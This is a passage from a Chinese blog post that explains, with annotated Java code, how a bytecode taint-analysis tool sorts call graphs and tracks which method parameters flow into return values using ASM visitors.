class="comment">/**</span></span><br><span class="line"><span class="comment"> * 逆拓扑排序的具体实现</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> outgoingReferences 方法调用的方法集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sortedMethods      逆拓扑排序后的方法集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> visitedNodes       已排序的方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> stack              栈</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> node               待排序的起始方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfsTsort</span><span class="params">(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences,</span></span></span><br><span class="line"><span class="function"><span class="params">                             List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes,</span></span></span><br><span class="line"><span class="function"><span class="params">                             Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 防止在遍历一条调用链中进入循环</span></span><br><span class="line">    <span class="keyword">if</span> (stack.contains(node)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防止对某个方法及被调方法重复排序</span></span><br><span class="line">    <span class="keyword">if</span> (visitedNodes.contains(node)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据起始方法，取出被调用的方法集合</span></span><br><span class="line">    Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node);</span><br><span class="line">    <span class="keyword">if</span> (outgoingRefs == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stack.add(node);    <span class="comment">// 入栈，避免递归死循环</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle child : outgoingRefs) &#123; <span class="comment">// 对被调用方法递归进行排序</span></span><br><span class="line">        dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child);</span><br><span class="line">    &#125;</span><br><span class="line">    stack.remove(node); <span class="comment">// 出栈，方法排序完毕</span></span><br><span class="line">    visitedNodes.add(node);     <span class="comment">// 记录已访问的方法，在递归遇到重复方法时可以跳过</span></span><br><span class="line">    sortedMethods.add(node);    <span class="comment">// 记录已排序的方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后使用 <code>calculatePassthroughDataflow</code> 方法判断每个方法的返回值与参数关系，首先跳过静态代码块，然后利用 asm 的访问者对逆拓扑排序得到的方法集合进行遍历和分析判断。</p><ul><li>静态代码块在类加载时调用，只执行一次，且优先于主函数。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 分析方法调用集合，获取数据流信息：方法-&gt;传递污染的参数索引</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceByName 类资源集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classMap            类信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inheritanceMap      继承信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sortedMethods       所有方法集合（经过逆拓扑排序）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> serializableDecider 序列化决策者</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; calculatePassthroughDataflow(Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName,</span><br><span class="line">                                                                                      Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span><br><span class="line">                                                                                      InheritanceMap inheritanceMap,</span><br><span class="line">                                                                                      List&lt;MethodReference.Handle&gt; sortedMethods,</span><br><span class="line">                                                                                      SerializableDecider serializableDecider) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 数据流信息：方法、传递污染的参数索引</span></span><br><span class="line">    <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有方法</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle method : sortedMethods) &#123;</span><br><span class="line">        <span class="comment">// 跳过 static 静态初始化代码（静态代码块）</span></span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;&lt;clinit&gt;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取方法所属类的类资源</span></span><br><span class="line">        ClassResourceEnumerator.ClassResource classResource = classResourceByName.get(method.getClassReference().getName());</span><br><span class="line">        <span class="keyword">try</span> (InputStream inputStream = classResource.getInputStream()) &#123;    <span class="comment">// 读取类文件</span></span><br><span class="line">            ClassReader cr = <span class="keyword">new</span> ClassReader(inputStream);  <span class="comment">// 创建 ClassReader，后续调用 accept 方法解析类文件</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * classMap             类信息</span></span><br><span class="line"><span class="comment">                 * inheritanceMap       继承信息</span></span><br><span class="line"><span class="comment">                 * passthroughDataflow  数据流信息，初始为空</span></span><br><span class="line"><span class="comment">                 * serializableDecider  序列化决策者</span></span><br><span class="line"><span class="comment">                 * Opcodes.ASM6         ASM API 版本</span></span><br><span class="line"><span class="comment">                 * method               待观察的方法</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="comment">// 继承 asm 的 ClassVisitor(MethodVisitor) 实现对类文件的观察，记录类信息和方法信息</span></span><br><span class="line">                PassthroughDataflowClassVisitor cv = <span class="keyword">new</span> PassthroughDataflowClassVisitor(classMap, inheritanceMap,</span><br><span class="line">                        passthroughDataflow, serializableDecider, Opcodes.ASM6, method);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）：visit -&gt; visitMethod</span></span><br><span class="line">                cr.accept(cv, ClassReader.EXPAND_FRAMES);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 缓存方法的哪些参数会影响返回值</span></span><br><span class="line">                passthroughDataflow.put(method, cv.getReturnTaint());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Exception analyzing &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            LOGGER.error(<span class="string">&quot;Unable to analyze &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PassthroughDataflowClassVisitor</code> 继承了 asm 中的 ClassVisitor，重写 <code>visit</code> 记录方法所属类的名称，重写 <code>visitMethod</code> 对待观察的方法用 <code>PassthroughDataflowMethodVisitor</code> 判断返回值与参数的关系，方法 <code>getReturnTaint</code> 返回能够传递污染的参数索引集合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PassthroughDataflowClassVisitor</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap;    <span class="comment">// 类信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle methodToVisit;     <span class="comment">// 待观察的方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;            <span class="comment">// 继承信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// 数据流信息：方法-&gt;传递污染的参数索引</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;  <span class="comment">// 序列化决策者</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String name;    <span class="comment">// 类名</span></span><br><span class="line">    <span class="keyword">private</span> PassthroughDataflowMethodVisitor passthroughDataflowMethodVisitor;  <span class="comment">// 方法访问者</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PassthroughDataflowClassVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                           InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow,</span></span></span><br><span class="line"><span class="function"><span class="params">                                           SerializableDecider serializableDecider, <span class="keyword">int</span> api, MethodReference.Handle methodToVisit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(api); <span class="comment">// ASM API 版本</span></span><br><span class="line">        <span class="keyword">this</span>.classMap = classMap;</span><br><span class="line">        <span class="keyword">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="keyword">this</span>.methodToVisit = methodToVisit;</span><br><span class="line">        <span class="keyword">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="keyword">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature,</span></span></span><br><span class="line"><span class="function"><span class="params">                      String superName, String[] interfaces)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">        <span class="keyword">this</span>.name = name;   <span class="comment">// 记录类名</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 不是待观察方法的所属类</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.name.equals(methodToVisit.getClassReference().getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Expecting to visit &quot;</span> + methodToVisit.getClassReference().getName() + <span class="string">&quot; but instead got &quot;</span> + <span class="keyword">this</span>.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 不是待观察方法</span></span><br><span class="line">        <span class="keyword">if</span> (!name.equals(methodToVisit.getName()) || !desc.equals(methodToVisit.getDesc())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (passthroughDataflowMethodVisitor != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Constructing passthroughDataflowMethodVisitor twice!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用父类方法，返回新的方法观察者</span></span><br><span class="line">        <span class="comment">// 如果类观察者的 cv 变量为空，则返回 null，否则返回 cv.visitMethod</span></span><br><span class="line">        MethodVisitor mv = <span class="keyword">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建方法访问者，判断方法返回值与参数的关系</span></span><br><span class="line">        <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）：visitCode -&gt; visitInsn -&gt; visitFieldInsn -&gt; visitMethodInsn</span></span><br><span class="line">        passthroughDataflowMethodVisitor = <span class="keyword">new</span> PassthroughDataflowMethodVisitor(</span><br><span class="line">                classMap, inheritanceMap, <span class="keyword">this</span>.passthroughDataflow, serializableDecider,</span><br><span class="line">                api, mv, <span class="keyword">this</span>.name, access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 简化代码分析，删除 JSR 指令并内联引用的子例程</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JSRInlinerAdapter(passthroughDataflowMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回能够传递污染的参数索引集合</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Set&lt;Integer&gt; <span class="title">getReturnTaint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (passthroughDataflowMethodVisitor == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Never constructed the passthroughDataflowmethodVisitor!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> passthroughDataflowMethodVisitor.returnTaint;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PassthroughDataflowMethodVisitor</code> 继承 <code>TaintTrackingMethodVisitor</code> 实现，重写了其中的 4 个访问者方法：</p><ul><li>visitCode：启动对方法代码的访问，把参数全部存到本地变量表</li><li>visitInsn：访问零操作数的指令，这里只分析返回指令</li><li>visitFieldInsn：访问字段指令，字段指令是加载或存储对象字段值的指令</li><li>visitMethodInsn：访问方法指令，方法指令是调用方法的指令</li></ul><p>但是 TaintTrackingMethodVisitor 继承 asm 的 MethodVisitor 并重写了大量的方法，模拟 JVM 在处理方法调用中的本地变量表和操作数栈，因此实际调用的访问者方法来自 PassthroughDataflowMethodVisitor、TaintTrackingMethodVisitor、MethodVisitor 三个类。模拟是根据对字节码指令和 JVM 的了解手动进行实现（救命），先解析这里的 4 个重写方法。</p><p>数据流信息 <code>passthroughDataflow</code> 初始为空，集合变量 <code>returnTaint</code> 用于记录传递污染的参数索引。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PassthroughDataflowMethodVisitor</span> <span class="keyword">extends</span> <span class="title">TaintTrackingMethodVisitor</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, ClassReference&gt; classMap;              <span class="comment">// 类信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;                                    <span class="comment">// 继承信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// 数据流信息：方法-&gt;传递污染的参数索引</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;                          <span class="comment">// 序列化决策者</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> access;               <span class="comment">// 访问标志</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String desc;              <span class="comment">// 描述符</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Integer&gt; returnTaint; <span class="comment">// 能够传递污染的参数索引集合</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PassthroughDataflowMethodVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle,</span></span></span><br><span class="line"><span class="function"><span class="params">            Set&lt;Integer&gt;&gt; passthroughDataflow, SerializableDecider serializableDeciderMap, <span class="keyword">int</span> api, MethodVisitor mv,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            String owner, <span class="keyword">int</span> access, String name, String desc, String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inheritanceMap, passthroughDataflow, api, mv, owner, access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="keyword">this</span>.classMap = classMap;</span><br><span class="line">        <span class="keyword">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="keyword">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="keyword">this</span>.serializableDecider = serializableDeciderMap;</span><br><span class="line">        <span class="keyword">this</span>.access = access;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">        returnTaint = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitCode</code> 方法将被访问的方法参数记录到本地变量表中，如果是非静态方法，则添加隐式参数 this。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;   <span class="comment">// 启动对方法代码的访问</span></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitCode 初始化本地变量表</span></span><br><span class="line">    <span class="keyword">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录参数到本地变量表 savedVariableState.localVars</span></span><br><span class="line">    <span class="keyword">int</span> localIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> argIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 非静态方法，第一个参数（隐式）为对象实例 this</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用 TaintTrackingMethodVisitor.setLocalTaint 添加到本地变量表</span></span><br><span class="line">        setLocalTaint(localIndex, argIndex);</span><br><span class="line">        localIndex += <span class="number">1</span>;</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历参数，根据描述符得出参数类型（占用空间大小）</span></span><br><span class="line">    <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">        <span class="comment">// 调用 TaintTrackingMethodVisitor.setLocalTaint 添加到本地变量表</span></span><br><span class="line">        setLocalTaint(localIndex, argIndex);</span><br><span class="line">        localIndex += argType.getSize();</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitInsn</code> 方法将存储在栈顶的返回值（传递污染的参数索引集合，可能为空）中的元素添加到 <code>returnTaint</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span> </span>&#123; <span class="comment">// 访问零操作数指令</span></span><br><span class="line">    <span class="comment">// 方法执行完毕后将从栈返回结果给调用者，因此栈顶即返回值</span></span><br><span class="line">    <span class="comment">// 存储可能被污染的返回值到 returnTaint</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.IRETURN:   <span class="comment">// 从当前方法返回 int</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.FRETURN:   <span class="comment">// 从当前方法返回 float</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.ARETURN:   <span class="comment">// 从当前方法返回对象引用</span></span><br><span class="line">            <span class="comment">// 调用 TaintTrackingMethodVisitor.getStackTaint 读取栈顶，大小为 1（32位）</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">0</span>));   <span class="comment">// 栈空间从内存高位到低位分配空间</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.LRETURN:   <span class="comment">// 从当前方法返回 long</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.DRETURN:   <span class="comment">// 从当前方法返回 double</span></span><br><span class="line">            <span class="comment">// 调用 TaintTrackingMethodVisitor.getStackTaint 读取栈顶，大小为 2（64位）</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.RETURN:    <span class="comment">// 从当前方法返回 void</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitInsn 进行出/入栈操作</span></span><br><span class="line">    <span class="keyword">super</span>.visitInsn(opcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitFieldInsn</code> 方法在读取或存储对象字段的值时调用，这里判断字段是否可序列化，如果可序列化则认为方法所属类的实例对象本身或被调用方法所属类的实例对象是受污染的，将其传递污染的参数索引集合存储到 <code>taint</code> 变量中。<br>因为可能读取的是方法所属类的实例对象字段，也可能是其他对象，其他对象得通过方法调用读取字段，涉及到方法调用方法，具体见 <code>visitMethodInsn</code> 方法中的分析。最后将栈顶（读取字段的返回值）设置为 <code>taint</code>，这里可能是空的 HashSet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitFieldInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc)</span> </span>&#123;    <span class="comment">// 访问字段指令，字段指令是加载或存储对象字段值的指令。</span></span><br><span class="line">    <span class="comment">// 方法执行过程中可能访问对象字段，访问前会进行入栈操作</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETSTATIC: <span class="comment">// 获取类的静态字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTSTATIC: <span class="comment">// 设置类的静态字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETFIELD:  <span class="comment">// 获取对象字段</span></span><br><span class="line">            Type type = Type.getType(desc); <span class="comment">// 字段类型</span></span><br><span class="line">            <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                Boolean isTransient = <span class="keyword">null</span>; <span class="comment">// 如果字段被 transient 关键字修饰，则不可序列化</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断读取的字段所属类是否可序列化，即字段是否可以序列化</span></span><br><span class="line">                <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                <span 